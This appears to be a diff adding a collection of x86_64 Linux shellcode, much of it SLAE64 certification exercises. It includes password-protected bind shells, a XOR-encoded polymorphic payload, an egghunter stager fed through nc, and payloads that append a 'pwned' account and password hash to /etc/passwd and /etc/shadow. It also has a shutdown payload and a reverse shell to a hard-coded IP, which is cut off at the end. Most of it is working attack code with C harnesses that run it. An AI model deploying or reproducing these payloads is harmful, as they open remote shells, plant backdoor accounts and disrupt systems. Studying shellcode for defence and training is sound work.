+      add cl, 2             ; rcx is 1, so add 2 = 3
+      push rax              ; restore socket
+      pop rdi
+dup_loop:
+      push rcx              ; have to save rcx as dup2
+                    ; changes it's value
+      xor rax, rax
+      sub rcx, 1
+      push rcx
+      pop rsi
+      add al, sys_dup2
+      syscall
+      pop rcx               ; restore the counter
+      loop dup_loop
+ 
+      jmp mytext
+ 
+code:
+      pop rdi
+      mov [rdi+7], BYTE al
+      push rax
+      pop rdx
+      add al, sys_execve
+      syscall
+ 
+mytext:
+    call code
+    MyText: db '/bin/sh', 0x41
+ 
+passfail:
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; ===================================================================
+; Password Protected Bind Shell
+; Author: SLAE64-1351 (Keyman)
+; Date: 03/09/2014
+;
+; Shellcode length:  147 bytes
+;
+; Description:
+;
+;    Simple bind shell (listens on port 4444 by default) with 4 bytes
+;    password protection. Using a 4 bytes long password is still
+;    reasonably strong for a single-shot connection and keeps the
+;    code shorter.
+;
+;    To change the port or the password just modify the values of the
+;    exp_port and exp_pass "variables" below.
+;
+;    After the code gets executed connect to the newly opened port:
+;   
+;    nc <IP address> <port number>
+;
+;    There is no password prompt. Type in the 4 bytes long password
+;    and hit enter. If the password matches, you are ready to type
+;    OS commands.
+;
+; ===================================================================
+ 
+global _start
+section .text
+ 
+; -------------------------------------------------------------------
+; Preprocessor directives so you can easily change the port and the
+; password.
+; -------------------------------------------------------------------
+ 
+; Port number to listen on.
+%define exp_port        0x5c11          ; 4444
+ 
+; Password to use.
+%define exp_pass        0x6c6c6568      ; hell
+ 
+; -------------------------------------------------------------------
+; DO NOT TOUCH
+; preprocessor directives so syscalls can be easily referenced
+; -------------------------------------------------------------------
+ 
+%define sys_bind    49
+%define sys_listen  50
+%define sys_accept  43
+%define sys_execve  59
+%define sys_dup2    33
+ 
+_start:
+ 
+    ; ---------------------------------------------------------------
+    ; START: create socket
+    ; ---------------------------------------------------------------
+      xor rax, rax
+      push rax              ; saving for sockaddr
+      push rax                          ; struct
+      push rax              ; clear rax later
+      push rax              ; set rdx to 0
+      pop rdx               ; protocol
+      mov al, 2
+      push rax
+      push rax
+      pop rsi
+      pop rdi               ; PF_INET
+      shr rsi, 1            ; SOCK_STREAM
+      add al, 39            ; socket syscall (41)
+      syscall
+ 
+    ; ---------------------------------------------------------------
+ 
+      push rax              ; store sockfd as first
+      pop rdi               ; argument of bind
+ 
+    ; ---------------------------------------------------------------
+    ; START: create struct
+    ;
+    ; srv_addr.sin_family = AF_INET;
+    ; srv_addr.sin_addr.s_addr = INADDR_ANY;
+    ; srv_addr.sin_port = htons(portno);
+    ;
+    ; This is how it looks like on the stack (port is 4444):
+    ;
+    ; 0x02   0x00   0x11   0x5c   0x00   0x00   0x00   0x00
+    ; 0x00   0x00   0x00   0x00   0x00   0x00   0x00   0x00
+    ; ---------------------------------------------------------------
+      pop rax               ; clear rax so can be
+                                        ; used for syscall Nr.
+      mov byte [rsp], 2         ; set values
+      mov word [rsp+2], exp_port
+      push rsp
+      pop rsi               ; addr of struct in rsi
+ 
+    ; ---------------------------------------------------------------
+    ; bind socket
+    ; ---------------------------------------------------------------
+ 
+      push rax
+      pop rdx
+      add dl, 16            ; socklen_t addrlen
+      add al, sys_bind          ; syscall number
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; listen
+    ; ---------------------------------------------------------------
+ 
+    ; rdi should still hold the socket descriptor so we don't
+    ; have to set it again
+ 
+      ; We can save a 'xor rax, rax' here.
+      ; If success, 0 is returned by bind, we will have the rax reg.
+      ; cleared.
+ 
+      push 2
+      pop rsi
+      add al, sys_listen
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; accept
+    ; ---------------------------------------------------------------
+ 
+    ; rdi should still hold the socket descriptor so we don't
+    ; have to set it again
+ 
+      ; We can save a 'xor rax, rax' here.
+      ; If success, 0 is returned by listen, we will have the rax reg.
+      ; cleared.
+ 
+      push rax
+      pop rdx
+      push rax
+      pop rsi
+      add al, sys_accept
+      syscall
+ 
+    ; at this point rax contains the new socket descriptor
+ 
+      push rax              ; save new sockfd
+      push rax              ;
+      pop rdi               ; first argument for
+                    ; read()
+      pop r15               ; save for later
+ 
+    ; ---------------------------------------------------------------
+    ; get passwd
+    ;
+    ; We will work with a 4 byte password, should be more than
+    ; enough as no brute forcing is possible. Chances to guess
+    ; the right value is 0.  Of course passwd should not contain
+    ; null bytes.
+    ;
+    ; n = read(newsockfd,buffer,4);
+    ; ---------------------------------------------------------------
+ 
+      xor rax, rax          ; read() is syscall Nr. 0
+      push rax              ; buffer filled with 0s
+      push rsp              ; setup pointer to buf
+      pop rsi
+      add rdx, 4
+      syscall
+ 
+      ; compare pass received with valid pass and exit if no match
+ 
+      xor rcx, rcx
+      inc rcx
+      push rsp
+      pop rdi
+      push exp_pass
+      push rsp
+      pop rsi
+      cmpsq
+      jne passfail          ; passwd match, give shell
+ 
+shell:
+    ; ---------------------------------------------------------------
+    ; 6. exec shell
+    ; ---------------------------------------------------------------
+ 
+      add cl, 2
+      mov rdi, r15
+dup_loop:
+      push rcx              ; have to save rcx as dup2
+                    ; changes it's value
+      xor rax, rax
+      sub rcx, 1
+      push rcx
+      pop rsi
+      add al, sys_dup2
+      syscall
+      pop rcx               ; restore the counter
+      loop dup_loop
+ 
+      jmp mytext
+ 
+code:
+    pop rdi
+    mov [rdi+7], BYTE al
+    push rax
+    push rax
+    pop rsi
+    pop rdx
+    add al, sys_execve
+    syscall
+ 
+mytext:
+    call code
+    MyText: db '/bin/sh', 0x41
+ 
+passfail:
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; ===================================================================
+; "Polymorphic" version of shellcode at:
+; http://shell-storm.org/shellcode/files/shellcode-658.php
+; Author: SLAE64-1351 (Keyman)
+; Date: 21/09/2014
+;
+; Length: 273 bytes (got shorter by 117 bytes)
+;
+; The original code was optimized. This way it became 240 bytes long.
+; Each byte of the optimized shellcode was XOR'ed with 0xDE. The
+; result was dumped as the encoded shellcode below. A decoder stub
+; was implemented to XOR each byte of "shellcode" with 0xDE. (except
+; the first byte). After the decoding is finished execution is
+; passed to the original (decoded) shellcode.
+;
+; ===================================================================
+ 
+section .text
+global _start
+ 
+_start:
+ 
+; -------------------------------------------------------------------
+; Shellcode decoder stub
+; -------------------------------------------------------------------
+ 
+    push 1
+    pop rcx
+begin:
+    cmp rcx, 1
+    je begin_sc
+    pop rdi                             ; rdi points to the shellcode
+    push byte 0x78
+    pop rcx
+    add rcx, 0x77
+decode:
+    xor byte [rdi+rcx], 0xDE
+    loop decode
+    jmp shellcode
+ 
+begin_sc:
+    dec rcx
+    call begin
+ 
+; -------------------------------------------------------------------
+; Encoded shellcode
+; -------------------------------------------------------------------
+ 
+shellcode:
+    sc: db 0xEB, 0xBB, 0x81, 0x5E, 0xB1, 0xD5, 0x9F, 0x5E, 0xB1, 0xC6, 0x9F, 0xB4, 0xDC, 0x87, 0xB4, 0xDC, 0x86, 0x8E, 0x8E, 0x80, 0x84, 0xB8, 0x5F, 0x18, 0xD1, 0xDA, 0xB8, 0x5F, 0x1C, 0x5C, 0xDC, 0x8F, 0xD1, 0xDB, 0x87, 0x97, 0x49, 0x96, 0x5D, 0x19, 0xD3, 0x3C, 0x3D, 0x96, 0x21, 0x11, 0x89, 0x80, 0x8E, 0x81, 0xB4, 0xDC, 0x87, 0xB4, 0xF0, 0x9F, 0x80, 0xB4, 0xDF, 0x86, 0x9F, 0x88, 0x84, 0x8F, 0xD1, 0xDB, 0x87, 0x96, 0x5D, 0x18, 0xEE, 0x97, 0x59, 0x21, 0xB4, 0xE5, 0x9F, 0x80, 0x3C, 0x37, 0xB4, 0xDC, 0x87, 0xB4, 0xDD, 0x86, 0x8F, 0xD1, 0xDB, 0x87, 0x97, 0x59, 0x21, 0x3C, 0x2A, 0x96, 0xEF, 0x21, 0xB4, 0xE2, 0x86, 0xD1, 0xDB, 0x36, 0x48, 0x21, 0x21, 0x21, 0xF1, 0xBB, 0xAA, 0xBD, 0xF1, 0xAE, 0xBF, 0xAD, 0xAD, 0xA9, 0xBA, 0x9F, 0xF1, 0xF1, 0xBB, 0xAA, 0xBD, 0xF1, 0xAD, 0xB6, 0xBF, 0xBA, 0xB1, 0xA9, 0x9F, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xE4, 0xA6, 0xE4, 0xEE, 0xE4, 0xEE, 0xE4, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xF0, 0xB1, 0xAC, 0xB9, 0xE4, 0xF1, 0xE4, 0xF1, 0xBC, 0xB7, 0xB0, 0xF1, 0xBC, 0xBF, 0xAD, 0xB6, 0xD4, 0xAD, 0xB6, 0xAD, 0xB6, 0xBB, 0xB2, 0xB2, 0xF3, 0xAD, 0xAA, 0xB1, 0xAC, 0xB3, 0xE4, 0xFA, 0xEF, 0xFA, 0xAC, 0xBB, 0x89, 0x9B, 0xE9, 0x99, 0x93, 0xEF, 0xFA, 0xBF, 0xA6, 0xBB, 0x93, 0xB9, 0xE8, 0x92, 0x8A, 0xAD, 0xF1, 0x8E, 0xBA, 0x8D, 0xB9, 0xBD, 0x98, 0x84, 0xEE, 0x8B, 0xED, 0x93, 0xF1, 0xE4, 0xEF, 0xEA, 0xE9, 0xE9, 0xE6, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xD4
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;Exam Assignment 3
+;implementation of egghunter
+;Default egg = "deaddead"                       ;
+;If connected the stager check of egg , if present execute the code   ;
+;You can send a maximum of 255 bytes (egg + code)                     ;
+;if no egg , shellcode exit                                           ;
+;Christophe G SLAE64 - 1337                                           ;
+
+
+
+global _start
+
+     jmp short _start
+    _start_code :
+        call rsi
+
+_start:
+
+
+    ; sock = socket(AF_INET, SOCK_STREAM, 0)
+    ; AF_INET = 2
+    ; SOCK_STREAM = 1
+    ; syscall number 41
+
+    xor rdx , rdx
+    push rdx        ; null into the stack 
+    push byte 0x29 ; syscall number 41
+    pop rax
+    push byte 0x2  ; AF_INET
+    pop rdi
+    push byte 0x1  ; SOCK_STREAM
+    pop rsi
+    syscall
+
+    ; copy socket descriptor to rdi for future use
+    xchg rax , rdi
+
+
+    ; server.sin_family = AF_INET
+    ; server.sin_port = htons(PORT)
+    ; server.sin_addr.s_addr = INADDR_ANY
+    ; bzero(&server.sin_zero, 8)
+
+     xor rax, rax
+
+     push rax  ; bzero(&server.sin_zero, 8)
+
+
+     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)
+
+
+     not rbx
+     push rbx
+     push rsp  ; save rsp value into the stack , needed for rsi later
+
+
+    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
+    ; syscall number 49
+
+
+    push byte 0x31 ; (49)
+    pop rax
+    pop rsi        ; retrieve value of rsp  pushed into the stack before
+    push byte 0x10  ; (16 bytes) sockaddr_len
+    pop rdx
+    syscall
+
+
+    ; listen(sock, MAX_CLIENTS)
+    ; syscall number 50
+
+    push byte 0x32 ; (50)
+    pop rax
+    push byte 0x2   ;MAX_CLIENTS
+
+    pop rsi
+    syscall
+
+
+    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
+    ; syscall number 43
+
+
+    push byte 0x2b   ; Accept syscall
+    pop rax
+    sub rsp, 0x10
+    push rsp
+    pop rsi       ;(struct sockaddr *)&client
+
+    push byte 0x10
+    push rsp
+    pop rdx    ; &sockaddr_len
+
+    syscall
+
+    ; store the client socket description
+    mov r9, rax
+
+    ; close parent
+
+    push byte 0x3
+    pop rax
+    syscall
+
+
+
+
+
+      xchg rdi , r9   ; restore client socket description to rdi
+      xor rsi , rsi
+
+  dup2:
+      push byte 0x21
+      pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop
+      syscall
+    inc rsi
+    cmp rsi , 0x3  ; go in the next couple of instruction if equals
+
+ loopne dup2
+
+       xor rsi , rsi
+       mul rsi
+       xor rdi , rdi
+       sub spl , 0xff
+       mov rsi , rsp
+       mov dl , 0xff
+       syscall
+
+      Inc_rsi:
+         cmp dil , 0xff
+         jz Exit
+         inc rsi
+         inc rdi
+
+
+
+      cmp [rsi - 4] , dword 0x64616564                   ; egghunter
+      jnz Inc_rsi
+      cmp [rsi - 8] , dword 0x64616564
+      jnz Inc_rsi
+      jz _start_code
+
+      Exit:
+         push byte 0x3c
+         pop rax
+         syscall
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+Usage :
+
+    Execve Shellcode 
+
+#(echo -ne "\x68\x85\x11\x47\x02\x64\x65\x61\x64\x64\x65\x61\x64\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43" ; cat) | nc localhost 4444
+
+
+"x68\x85\x11\x47\x02" -->> dumm bytes
+
+"\x64\x65\x61\x64\x64\x65\x61\x64" -->> egg (deaddead)
+
+"\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10"
+"\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff"  -->> shellcode Execve JCP 
+"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42"
+"\x42\x43\x43\x43\x43\x43\x43\x43\x43" 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Shellcode :
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char stager[] = \
+"\xeb\x02\xff\xd6\x48\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\x31\xc0\x50\x48\xc7\xc3\xfd\xff\xee\xa3\x48\xf7\xd3\x53\x54\x6a\x31\x58\x5e\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x03\xe0\xf2\x48\x31\xf6\x48\xf7\xe6\x48\x31\xff\x40\x80\xec\xff\x48\x89\xe6\xb2\xff\x0f\x05\x40\x80\xff\xff\x74\x1e\x48\xff\xc6\x48\xff\xc7\x81\x7e\xfc\x64\x65\x61\x64\x75\xeb\x81\x7e\xf8\x64\x65\x61\x64\x75\xe2\x0f\x84\x6a\xff\xff\xff\x6a\x3c\x58\x0f\x05";
+
+int main()
+
+{
+
+    printf("Stager Length:  %d\n", (int)strlen(stager));
+
+
+    (*(void  (*)()) stager)();
+
+
+
+
+
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; shellcode name add_user_password_JCP_open,write,close
+; Author    : Christophe G SLAE64-1337
+; Len       : 358 bytes
+; Language  : Nasm
+; "name = pwned ; pass = $pass$"
+; add user and password with open,write,close
+; tested kali linux , kernel 3.12
+
+
+global _start
+
+_start:
+
+       xor rax , rax
+       push rax
+       pop rsi
+       push rax                                       ; null all register used for open syscall
+       pop rdx
+       add al , 0x2
+       mov rdi , 0x647773ffffffffff
+       shr rdi , 0x28
+       push rdi                                       ; "/etc/passwd"
+       mov rdi , 0x7361702f6374652f
+       push rdi
+       mov rdi , rsp
+       mov si , 0x441
+       mov dx , 0x284
+       syscall                                        ; open syscall
+
+       xor edi , edi
+       add dil , 0x3
+
+jmp short findaddress                                   ; I placed the jmp short here size of code is too lenght for jmp short if placed in head 
+
+_respawn:
+
+       pop r9
+       mov  [r9 + 0x30] , byte 0xa                     ; terminate the string 
+       lea rsi , [r9]   ; "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash'    
+       mov al , 0x1                                    
+       xor rdx , rdx
+       add rdx , 0x31
+       syscall                                         ; write syscall
+
+       xor edi , edi
+       add dil , 0x3
+       push rdi                                  
+pop rax
+       syscall                                         ; close syscall
+
+       xor rax , rax
+       push rax
+       pop rsi
+       add al , 0x2
+       mov rdi , 0x776f64ffffffffff                   ; open '/etc/shadow'
+       shr rdi , 0x28
+       push rdi
+       mov rdi , 0x6168732f6374652f
+       push rdi
+       mov rdi , rsp
+       mov si , 0x441
+       mov dx , 0x284
+       syscall                                       ; open syscall
+
+
+       xor rax , rax
+       add al , 0x1
+       xor edi , edi
+       add dil , 0x3
+       lea rsi , [r9 + 0x31]                      ;  "pwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::", 0xa
+       push rax
+       pop rdx
+       add dl , 0x83
+       syscall                                    ; write syscall 
+
+       xor edi , edi
+       add dil , 0x3
+       push rdi
+       pop rax
+       syscall
+
+
+
+
+       xor rax , rax
+       add al , 0x3c                             ;   exit (no matter value of exit code)
+       syscall
+
+
+     findaddress:
+        call _respawn
+        string : db "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bashApwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::",0xa
+
+
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x48\x31\xc0\x50\x5e\x50\x5a\x04\x02\x48\xbf\xff\xff\xff\xff\xff\x73\x77\x64\x48\xc1\xef\x28\x57\x48\xbf\x2f\x65\x74\x63\x2f\x70\x61\x73\x57\x48\x89\xe7\x66\xbe\x41\x04\x66\xba\x84\x02\x0f\x05\x31\xff\x40\x80\xc7\x03\xeb\x74\x41\x59\x41\xc6\x41\x30\x0a\x49\x8d\x31\xb0\x01\x48\x31\xd2\x48\x83\xc2\x31\x0f\x05\x31\xff\x40\x80\xc7\x03\x57\x58\x0f\x05\x48\x31\xc0\x50\x5e\x04\x02\x48\xbf\xff\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xef\x28\x57\x48\xbf\x2f\x65\x74\x63\x2f\x73\x68\x61\x57\x48\x89\xe7\x66\xbe\x41\x04\x66\xba\x84\x02\x0f\x05\x48\x31\xc0\x04\x01\x31\xff\x40\x80\xc7\x03\x49\x8d\x71\x31\x50\x5a\x80\xc2\x83\x0f\x05\x31\xff\x40\x80\xc7\x03\x57\x58\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\x87\xff\xff\xff\x70\x77\x6e\x65\x64\x3a\x78\x3a\x31\x30\x30\x31\x3a\x31\x30\x30\x32\x3a\x70\x77\x6e\x65\x64\x2c\x2c\x2c\x3a\x2f\x68\x6f\x6d\x65\x2f\x70\x77\x6e\x65\x64\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x70\x77\x6e\x65\x64\x3a\x24\x36\x24\x75\x69\x48\x37\x78\x2e\x76\x68\x69\x76\x44\x37\x4c\x4c\x58\x59\x24\x37\x73\x4b\x31\x4c\x31\x4b\x57\x2e\x43\x68\x71\x57\x51\x5a\x6f\x77\x33\x65\x73\x76\x70\x62\x57\x56\x58\x79\x52\x36\x4c\x41\x34\x33\x31\x74\x4f\x4c\x68\x4d\x6f\x52\x4b\x6a\x50\x65\x72\x6b\x47\x62\x78\x52\x51\x78\x64\x49\x4a\x4f\x32\x49\x61\x6d\x6f\x79\x6c\x37\x79\x61\x56\x4b\x55\x56\x6c\x51\x38\x44\x4d\x6b\x33\x67\x63\x48\x4c\x4f\x4f\x66\x2f\x3a\x31\x36\x32\x36\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a\x3a\x0a";
+
+
+
+int main()
+{
+    printf("Shellcode Length:  %d\n", (int)strlen(code));
+    (*(void  (*)()) code)();
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; shellcode name add_user_password
+; Author    : Christophe G SLAE64-1337
+; Len       : 273 bytes
+; Language  : Nasm
+; "name = pwned ; pass = $pass$"
+; add user and password with echo cmd
+; tested kali linux , kernel 3.12
+
+
+
+global _start
+
+_start:
+        jmp short findaddress
+                                                                 
+_realstart:
+        pop rdi
+        xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
+        xor byte [rdi + 10]  ,0x41 ; same "-cA"
+        xor rdx , rdx
+        lea rdi , [rdi]
+        lea r9 , [rdi + 8]
+        lea r10 , [rdi + 11]
+        push rdx
+        push r10
+        push r9
+        push rdi
+        mov rsi , rsp
+        add al , 59
+        syscall
+
+
+findaddress:
+        call _realstart
+        string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"
+
+unsigned char code[] = \
+"\xeb\x24\x5f\x80\x77\x07\x41\x80\x77\x0a\x41\x48\x31\xd2\x48\x8d\x3f\x4c\x8d\x4f\x08\x4c\x8d\x57\x0b\x52\x41\x52\x41\x51\x57\x48\x89\xe6\x04\x3b\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x2d\x63\x41\x65\x63\x68\x6f\x20\x70\x77\x6e\x65\x64\x3a\x78\x3a\x31\x30\x30\x31\x3a\x31\x30\x30\x32\x3a\x70\x77\x6e\x65\x64\x2c\x2c\x2c\x3a\x2f\x68\x6f\x6d\x65\x2f\x70\x77\x6e\x65\x64\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x20\x3b\x20\x65\x63\x68\x6f\x20\x70\x77\x6e\x65\x64\x3a\x5c\x24\x36\x5c\x24\x75\x69\x48\x37\x78\x2e\x76\x68\x69\x76\x44\x37\x4c\x4c\x58\x59\x5c\x24\x37\x73\x4b\x31\x4c\x31\x4b\x57\x2e\x43\x68\x71\x57\x51\x5a\x6f\x77\x33\x65\x73\x76\x70\x62\x57\x56\x58\x79\x52\x36\x4c\x41\x34\x33\x31\x74\x4f\x4c\x68\x4d\x6f\x52\x4b\x6a\x50\x65\x72\x6b\x47\x62\x78\x52\x51\x78\x64\x49\x4a\x4f\x32\x49\x61\x6d\x6f\x79\x6c\x37\x79\x61\x56\x4b\x55\x56\x6c\x51\x38\x44\x4d\x6b\x33\x67\x63\x48\x4c\x4f\x4f\x66\x2f\x3a\x31\x36\x32\x36\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a\x3a\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77"
+;
+
+int main()
+{
+    printf("Shellcode Length:  %d\n", (int)strlen(code));
+    (*(void  (*)()) code)();
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+; Title: shutdown -h now x86_64 Shellcode - 65 bytes
+; Platform: linux/x86_64
+; Date: 2014-06-27
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+section .text
+
+global _start
+
+_start:
+
+xor rax, rax
+xor rdx, rdx 
+
+push rax
+push byte 0x77
+push word 0x6f6e ; now
+mov rbx, rsp
+
+push rax
+push word 0x682d ;-h
+mov rcx, rsp
+
+push rax
+mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
+mov r10, 0x6e776f6474756873
+push r10
+push r8
+mov rdi, rsp
+
+push rdx
+push rbx
+push rcx
+push rdi
+mov rsi, rsp
+
+add rax, 59
+syscall
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
+"\x50\x66\x68\x2d\x68\x48\x89\xe1"
+"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
+"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
+"\x74\x64\x6f\x77\x6e\x41\x52\x41"
+"\x50\x48\x89\xe7\x52\x53\x51\x57"
+"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
+"\x05";
+
+int
+main() {
+
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+int (*ret)() = (int(*)())code;
+ret();
+
+return 0;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;Bind_TCP 4444  with password                        ;
+;Default password = Password                         ;
+;If connected the shellcode no prompt for password   ;
+;Enter password directly and you get the bin/sh shell;
+;if password is wrong the shellcode exit:            ;
+;Christophe G SLAE64 - 1337 size 173 bytes           ;
+
+
+
+global _start
+
+
+
+_start:
+      
+
+; sock = socket(AF_INET, SOCK_STREAM, 0)
+; AF_INET = 2
+; SOCK_STREAM = 1
+; syscall number 41 
+
+push 0x29
+pop rax
+push 0x2
+pop rdi
+push 0x1
+pop rsi
+xchg rbx , rdx
+syscall
+
+; copy socket descriptor to rdi for future use 
+xchg rax , rdi
+
+
+; server.sin_family = AF_INET 
+; server.sin_port = htons(PORT)
+; server.sin_addr.s_addr = INADDR_ANY
+; bzero(&server.sin_zero, 8)
+
+xor rax, rax 
+
+mov dword [rsp - 4] , eax
+mov word [rsp - 6] ,0x5c11
+mov byte [rsp - 8] , 0x2
+sub rsp , 8
+
+
+; bind(sock, (struct sockaddr *)&server, sockaddr_len)
+; syscall number 49
+push 0x31
+pop rax
+mov rsi, rsp
+push 0x10
+pop rdx
+syscall
+
+
+; listen(sock, MAX_CLIENTS)
+; syscall number 50
+
+push 0x32
+pop rax
+push 0x2
+pop rsi 
+syscall
+
+
+; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
+; syscall number 43
+
+
+push 0x2b
+pop rax
+sub rsp, 0x10
+mov rsi, rsp
+push 0x10
+mov rdx, rsp
+
+syscall
+
+; store the client socket description 
+mov r9, rax 
+
+; close parent
+push 0x3
+pop rax
+syscall
+
+
+
+
+
+xchg rdi , r9
+xor rsi , rsi
+
+dup2:
+    push 0x21
+    pop rax
+    syscall
+    inc rsi
+    cmp rsi , 0x2
+    loopne dup2
+
+CheckPass:
+    xor rax , rax
+    push 0x10
+    pop rdx
+    sub rsp , 16                 ; 16 bytes to receive user input 
+    mov rsi , rsp
+    xor edi , edi
+    syscall                      ; system read function call
+    mov rax , 0x64726f7773736150 ; "Password"
+    lea rdi , [rel rsi]
+    scasq
+    jz Execve
+    push 0x3c
+    pop rax
+    syscall
+
+
+
+
+
+Execve:
+    xor rax , rax
+    mov rdx , rax 
+    push rax
+
+    mov rbx, 0x68732f2f6e69622f
+    push rbx
+
+    ; store /bin//sh address in RDI
+    mov rdi, rsp
+
+    ; Second NULL push
+    push rax
+                
+
+    ; Push address of /bin//sh
+    push rdi
+
+    ; set RSI
+    mov rsi, rsp
+
+    ; Call the Execve syscall
+    push 0x3b
+    pop rax
+    syscall
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+; Author Andriy Brukhovetskyy - doomedraven - SLAEx64 1322
+; 138 bytes
+global _start
+section .text
+_start:
+
+   ;socket syscall
+   push byte 0x29 ; 41 socket 
+   pop rax    
+   push byte 0x2 ; AF_INET
+   pop rdi  
+   push byte 0x1 ; SOCK_STREAM
+   pop rsi    
+   cdq ;rdx = 0 - ANY
+   syscall
+   
+   xchg rdi, rax ; save socket descriptor
+   
+   mov dword [rsp-4], 0x0901a8c0 ; ip
+   mov word [rsp-6], 0x5c11      ; port 4444
+   mov byte [rsp-8], 0x02
+   sub rsp, 8
+   
+   push byte 0x2a ; connect
+   pop rax
+   mov rsi, rsp   ; pointer    
+   push byte 0x10 ; len
+   pop rdx
+   syscall
+
+   push byte 0x3; counter 
+   pop rsi
+
+dup2_loop:
+   dec rsi
+   push byte 0x21
+   pop rax
+   syscall
+   jnz dup2_loop ; jump if not 0
+
+   ;read buffer
+   mov rdi, rax ; socket
+   ;xor rax, rax
+   cdq
+   mov byte [rsp-1], al ;0 read
+   sub rsp, 1
+         
+   push rdx 
+   lea rsi, [rsp-0x10] ; 16 bytes from buf
+   add dl, 0x10        ; size_t count
+   syscall
+   
+   ;test passcode
+   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
+   push rdi                    ; save the socket
+   lea rdi, [rsi]              ; load string from address
+   scasq                       ; compare
+   jz accepted_passwd          ; jump if equal
+   
+   ;exit if different :P
+   push byte 0x3c 
+   pop rax
+   syscall
+
+accepted_passwd:
+   
+   ;execve
+   pop rdi; socket
+   xor rax, rax
+   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
+   push rbx
+   mov rdi, rsp
+   push rax
